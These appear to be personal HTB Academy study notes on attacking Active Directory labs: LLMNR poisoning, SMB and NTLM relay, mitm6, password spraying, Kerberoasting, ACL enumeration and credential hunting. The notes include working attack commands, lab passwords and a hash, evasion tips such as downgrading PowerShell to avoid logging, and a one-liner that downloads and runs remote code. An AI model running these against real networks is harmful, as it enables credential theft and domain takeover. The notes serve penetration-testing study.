---
title: "Active Directory (AD)"
date: 2026-08-01 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "LLMNR/NBT-NS poisoning with Responder, NTLM relay attacks, Kerberoasting, AS-REP Roasting, and Inveigh exploitation."
image:
  path: /assets/img/posts/active_directory.jpg
  alt: Active Directory (AD)
---

# Initial attacking vectors

these can be a little outdated, but the five are

1. netbios and llmnr name poisoning
2. relay attacks
3. eternalblue
4. kerberoasting
5. mitm6

## llmnr name poisoning

```bash
# firstly set a responder from impacket
python3 Responder.py -l tun0 -rdw

# or
responder -I eth0 -rdw
```

the response will be a name and password  ntlmv2 hash from an user..

## if in windows pc

```powershell
## C# Inveigh (InveighZero)
.\Inveigh.exe

# press ESC to open the console
GET NTLMV2UNIQUE
```

if we try to crack the password

```bash
# copied the exact output, with names and all
hashcat -m 5600 pass.txt rockyou.txt
```

mitigation is, completely disable llmnr and nbt-ns. or if they cant enforce nac, and enforce really long passwords min 16 length etc

## smb relays

requirements for this

1. SMB signing must be disabled
2. relayed user credentials must be admin on that machine

FIRST STEP is running [responder.py](http://responder.py) but DISABLING smb and http responses

second step is running this

```bash
python3 ntlmrelayx.py -tf targets.txt -smb2support

# -i for interactive shell spawn
```

smb signing disabled can be found by nessus scan, or nmap script or custom github scripts

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
```

# mitm6

```bash
mitm6 -d domain.name

#in another shell we gonna set relay
ntlmrelayx.py -6 -t ldaps://dc.ip -wh fakewpad.domainname.local -l loot
```

# HTB

## passive enum

```bash
nslookup ns1.inlanefreight.com

```

The first check we ran was looking for any documents. Using `filetype:pdf inurl:inlanefreight.com` as a search, we are looking for PDFs.

Using the dork `intext:"@inlanefreight.com" inurl:inlanefreight.com`, we are looking for any instance that appears similar to the end of an email address on the website. 

We can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.

```bash
dig axfr
dig
nslookup

```

#### **Credential Hunting**

[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.

### **Enumerating & Retrieving Password Policies**

. With valid domain credentials, the password policy can also be obtained remotely using tools such as [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or `rpcclient`.

```powershell
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

**Enumerating the Password Policy - from Linux - SMB NULL Sessions**

When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as `enum4linux`, `CrackMapExec`, `rpcclient`, etc.

We can use [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) to check a Domain Controller for SMB NULL session access.

Once connected, we can issue an RPC command such as `querydominfo` to obtain information about the domain and confirm NULL session access.

```powershell
 rpcclient -U "" -N 172.16.5.5
 
rpcclient $> querydominfo

```

```powershell
 enum4linux -P 172.16.5.5
 # same purpose
 enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

**Enumerating the Password Policy - from Linux - LDAP Anonymous Bind**

```powershell
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### username enumeration

smb null 

```powershell
 enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```powershell
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
```

```powershell
 crackmapexec smb 172.16.5.5 --users

```

**Gathering Users with LDAP Anonymous**

```powershell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```powershell
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

#### **Enumerating Users with Kerbrute**

As mentioned in the `Initial Enumeration of The Domain` section, if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying.

```powershell
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

**Credentialed Enumeration to Build our User List**

```powershell
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

## Password spraying

```powershell
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

```

```powershell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# login to cracked account
 sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

**Local Admin Spraying with CrackMapExec**

```powershell
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

```

p spraying in windows

There are several options available to us with the tool. Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.

#### **Using DomainPasswordSpray.ps1**

```powershell

PS C:\htb> Import-Module .\DomainPasswordSpray.ps1PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1-OutFile spray_success-ErrorAction SilentlyContinue
```

## **Enumerating Security Controls**

**Checking the Status of Defender with Get-MpComputerStatus**

```powershell
 Get-MpComputerStatus
```

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization. [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the `PowerShell.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the `AppLocker` rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at:

`%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`

```powershell
Using Get-AppLockerPolicy cmdlet
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

```

PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.

```powershell
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

```

The Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions. One is parsing `ExtendedRights` for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.

#### **Using Find-LAPSDelegatedGroups**

```powershell
PS C:\htb> Find-LAPSDelegatedGroups

```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

```powershell
PS C:\htb> Find-AdmPwdExtendedRights

```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```powershell
PS C:\htb> Get-LAPSComputers

```

## credential enumeration

```bash
#CME - Domain Group Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

#CME - Logged On Users
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
 
#Share Enumeration - Domain Controller
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

#spider_plus will dig through each readable share on the host and list all readable files. 
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

#SMBMap To Check Access
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

#Recursive List Of All Directories
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

#Windapsearch - Privileged Users / for domain admins use --da instead of PU
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

```

### bloodhound usage

```bash
 sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:

- `user == neo4j` / `pass == HTB_@cademy_stdnt!`.

Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file. We do this by clicking the `Upload Data` button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit `Open`.

### windows side

**ActiveDirectory PowerShell Module**

The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing. We can't cover them all here, but we will look at a few that are particularly useful for enumerating AD environments. Feel free to explore other cmdlets included in the module in the lab built for this section, and see what interesting combinations and output you can create.

Before we can utilize the module, we have to make sure it is imported first. The [Get-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) cmdlet, which is part of the [Microsoft.PowerShell.Core module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2), will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.

#### **Discover Modules**

```powershell
        powershell
PS C:\htb> Get-Module
```

#### **Load ActiveDirectory Module**

```powershell
        powershell
PS C:\htb> Import-Module ActiveDirectoryPS C:\htb> Get-Module
```

#### **Get Domain Info**

```powershell
        powershell
PS C:\htb> Get-ADDomain
```

This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlet. We will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.

#### **Get-ADUser**

```powershell
        powershell
PS C:\htb> Get-ADUser -Filter{ServicePrincipalName-ne "$null"} -Properties ServicePrincipalName
```

#### **Checking For Trust Relationships**

```powershell
        powershell
PS C:\htb> Get-ADTrust -Filter*
```

#### **Group Enumeration**

```powershell
        powershell
PS C:\htb> Get-ADGroup -Filter* | select name
```

#### **Detailed Group Info**

```powershell
        powershell
PS C:\htb> Get-ADGroup -Identity"Backup Operators"
```

#### **Group Membership**

```powershell
        powershell
PS C:\htb> Get-ADGroupMember -Identity"Backup Operators"
```

### **PowerView**

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.

Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.

| **Command** | **Description** |
| --- | --- |
| `Export-PowerViewCSV` | Append results to a CSV file |
| `ConvertTo-SID` | Convert a User or group name to its SID value |
| `Get-DomainSPNTicket` | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |
| **Domain/LDAP Functions:** |  |
| `Get-Domain` | Will return the AD object for the current (or specified) domain |
| `Get-DomainController` | Return a list of the Domain Controllers for the specified domain |
| `Get-DomainUser` | Will return all users or specific user objects in AD |
| `Get-DomainComputer` | Will return all computers or specific computer objects in AD |
| `Get-DomainGroup` | Will return all groups or specific group objects in AD |
| `Get-DomainOU` | Search for all or specific OU objects in AD |
| `Find-InterestingDomainAcl` | Finds object ACLs in the domain with modification rights set to non-built in objects |
| `Get-DomainGroupMember` | Will return the members of a specific domain group |
| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
| `Get-DomainDFSShare` | Returns a list of all distributed file systems for the current (or specified) domain |
| **GPO Functions:** |  |
| `Get-DomainGPO` | Will return all GPOs or specific GPO objects in AD |
| `Get-DomainPolicy` | Returns the default domain policy or the domain controller policy for the current domain |
| **Computer Enumeration Functions:** |  |
| `Get-NetLocalGroup` | Enumerates local groups on the local or a remote machine |
| `Get-NetLocalGroupMember` | Enumerates members of a specific local group |
| `Get-NetShare` | Returns open shares on the local (or a remote) machine |
| `Get-NetSession` | Will return session information for the local (or a remote) machine |
| `Test-AdminAccess` | Tests if the current user has administrative access to the local (or a remote) machine |
| **Threaded 'Meta'-Functions:** |  |
| `Find-DomainUserLocation` | Finds machines where specific users are logged in |
| `Find-DomainShare` | Finds reachable shares on domain machines |
| `Find-InterestingDomainShareFile` | Searches for files matching specific criteria on readable shares in the domain |
| `Find-LocalAdminAccess` | Find machines on the local domain where the current user has local administrator access |
| **Domain Trust Functions:** |  |
| `Get-DomainTrust` | Returns domain trusts for the current domain or a specified domain |
| `Get-ForestTrust` | Returns all forest trusts for the current forest or a specified forest |
| `Get-DomainForeignUser` | Enumerates users who are in groups outside of the user's domain |
| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping` | Will enumerate all trusts for the current domain and any others seen. |

We can use the [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/) function to test for local admin access on either the current machine or a remote one.

#### **Testing for Local Admin Access**

```powershell
        powershell
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

#### **Finding Users With SPN Set**

```powershell
        powershell
PS C:\htb> Get-DomainUser -SPN-Properties samaccountname,ServicePrincipalName
```

### **SharpView**

PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of [PowerView](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) has some new functions such as `Get-NetGmsa`, used to hunt for [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.

Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with `-Help` to get an argument list.

```bash
PS C:\htb> .\SharpView.exe Get-DomainUser -Help
```

# **Snaffler**

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.

To execute Snaffler, we can use the command below:

#### **Snaffler Execution**

```bash
        bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

The `-s` tells it to print results to the console for us, the `-d` specifies the domain to search within, and the `-o` tells Snaffler to write results to a logfile. The `-v` option is the verbosity level. Typically `data` is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.

#### **Snaffler in Action**

```powershell
        powershell
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

# **Env Commands For Host & Network Recon**

First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.

#### **Basic Enumeration Commands**

| **Command** | **Result** |
| --- | --- |
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
| `ipconfig /all` | Prints out network adapter state and configurations |
| `set` | Displays a list of environment variables for the current session (ran from CMD-prompt) |
| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `echo %logonserver%` | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

# **Harnessing PowerShell**

PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

Let's look at a few of the ways PowerShell can help us.

| **Cmd-Let** | **Description** |
| --- | --- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: | ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

**Downgrade Powershell**

```powershell
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---

------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

# **Checking Defenses**

The next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.

#### **Firewall Checks**

```powershell
        powershell
PS C:\htb> netsh advfirewall show allprofilesDomain
```

#### **Windows Defender Check (from CMD.exe)**

```bash
        cmd
C:\htb> sc query windefend
```

### **Am I Alone?**

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

#### **Using qwinsta**

```powershell
        powershell
PS C:\htb> qwinsta SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE services0  Disc>console           forend1  Active rdp-tcp65536  Listen
```

Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.

#### **LDAP Filtering Explained**

You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).

`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

#### **UAC Values**

![Diagram of User Account Control Bit Values showing bit positions for various account settings like 'Login Script Will Execute' and 'Account Is Disabled'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/UAC-values.png)

#### **OID match strings**

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

1. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

1. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

#### **Logical Operators**

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:

`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:

`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

This would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

### **Dsquery**

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

#### **Dsquery DLL**

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

#### **User Search**

```powershell
        powershell
PS C:\htb> dsquery user
```

## Kerberoasting

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# or single with file save
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

#then cracking the hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

```bash
#for windows side
.\Rubeus.exe kerberoast /user:username /nowrap
```

## ACL Enumeration

### **Enumerating ACLs with PowerView**

We can use PowerView to enumerate ACLs, but the task of digging through *all* of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function `Find-InterestingDomainAcl` we will receive a massive amount of information back that we would need to dig through to make any sense of:

```powershell
PS C:\htb> Find-InterestingDomainAcl
```

r. Let's focus on the user `wley`, which we obtained after solving the last question in the `LLMNR/NBT-NS Poisoning - from Linux` section. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.

```powershell
        powershell
PS C:\htb> Import-Module .\PowerView.ps1PS C:\htb> $sid= Convert-NameToSid wley
```

We can then use the `Get-DomainObjectACL` function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the `$sid` variable to the `SecurityIdentifier` property which is what tells us *who* has the given right over an object. One important thing to note is that if we search without the flag `ResolveGUIDs`, we will see results like the below, where the right `ExtendedRight` does not give us a clear picture of what ACE entry the user `wley` has over `damundsen`. This is because the `ObjectAceType` property is returning a GUID value that is not human readable.

Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.

```powershell
PS C:\htb> Get-DomainObjectACL -Identity * | *?* {$_.SecurityIdentifier -eq $sid}

```

We could Google for the GUID value `00299570-246d-11d0-a768-00aa006e0529` and uncover [this](https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.

Note that if PowerView has already been imported, the cmdlet shown below will result in an error. Therefore, we may need to run it from a new PowerShell session.

**Performing a Reverse Search & Mapping to a GUID Value**

```powershell
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

```

This gave us our answer, but would be highly inefficient during an assessment. PowerView has the `ResolveGUIDs` flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the `ObjectAceType` property as `User-Force-Change-Password`.

#### **Using the -ResolveGUIDs Flag**

```powershell
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

**Creating a List of Domain Users**

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

**A Useful foreach Loop**

```powershell
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

### **Enumerating ACLs with BloodHound**

Now that we've enumerated the attack path using more manual methods like PowerView and built-in PowerShell cmdlets, let's look at how much easier this would have been to identify using the extremely powerful BloodHound tool. Let's take the data we gathered earlier with the SharpHound ingestor and upload it to BloodHound. Next, we can set the `wley` user as our starting node, select the `Node Info` tab and scroll down to `Outbound Control Rights`. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under `Transitive Object Control`. If we click on the `1` next to `First Degree Object Control`, we see the first set of rights that we enumerated, `ForceChangePassword` over the `damundsen` user.

#### **Viewing Node Info through BloodHound**

![BloodHound interface showing node info for WLEY@INLANEFREIGHT.LOCALl with execution and control rights, connected to DAMUNDSEN@INLANEFREIGHT.LOCAL via ForceChangePassword.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/wley_damundsen.png)

If we right-click on the line between the two objects, a menu will pop up. If we select `Help`, we will be presented with help around abusing this ACE, including:

- More info on the specific right, tools, and commands that can be used to pull off this attack
- Operational Security (Opsec) considerations
- External references.

We'll dig into this menu more later on.

#### **Investigating ForceChangePassword Further**

![Popup window in BloodHound showing ForceChangePassword capability for WLEY@INLANEFREIGHT.LOCAL to change DAMUNDSEN@INLANEFREIGHT.LOCAL's password without knowing the current password.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/help_edge.png)

If we click on the `16` next to `Transitive Object Control`, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.

#### **Viewing Potential Attack Paths through BloodHound**

